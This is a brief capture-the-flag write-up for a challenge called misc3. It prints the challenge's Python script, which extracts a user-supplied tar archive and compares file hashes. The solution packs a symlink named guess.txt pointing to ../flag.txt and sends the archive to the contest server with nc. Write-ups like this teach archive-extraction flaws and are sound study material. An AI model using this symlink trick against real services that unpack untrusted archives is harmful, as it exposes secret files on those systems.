# misc3

Author: HaopingKu  
date: July 14, 2016

we get `misc3.py` in this game
```python
#!/usr/bin/env python3

import os
import sys
import tempfile
import subprocess
import resource

resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536))
os.chdir(os.environ['HOME'])

size = int(sys.stdin.readline().rstrip('\r\n'))
if size > 65536:
    print('File is too large.')
    quit()

data = sys.stdin.read(size)
# with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf:
with open('flag/a.tar', 'w+') as tarf:
    # with tempfile.TemporaryDirectory(dir='.') as outdir:
        outdir = './tmpx'
        print('data length: ' + str(len(data)))
        tarf.write(data)
        tarf.flush()
        try:
            print(['/bin/tar', '-xf', tarf.name, '-C', outdir])
            subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir])
        except:
            print('Broken tar file.')
            raise

        try:
            a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])
            b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')])
            a = a.split(b' ')[0]
            b = b.split(b' ')[0]
            assert len(a) == 40 and len(b) == 40
            if a != b:
                raise Exception('sha1')
        except:
            print('Different.')
            raise

        print(open('flag.txt', 'r').readline())
```
First it reads a number from stdin, as the size of file which comes after in stdin.
After inputs, it save the content as a file in a temporary directory, and executes
```bash
/bin/tar -xf <temp_tar_file> -C <temp_dir>
```
After extract temp tar file, it checks the SHA sum of flag.txt and guess.txt. It seems like we need to guess the content in flag.txt, but we can bypass this by creating a link to flag.txt, that is, guess.txt is the same as flag.txt.

Lets create `guess.txt` as a symbolic link to `../flag.txt` in local machine
```bash
$ ln -s ../flag.txt guess.txt
$ tar cf a.tar guess.txt
```
then send it
```bash
echo -e "`stat -c '%s' a.tar`\n`cat a.tar`" | nc quiz.ais3.org 9150
```
flag get!

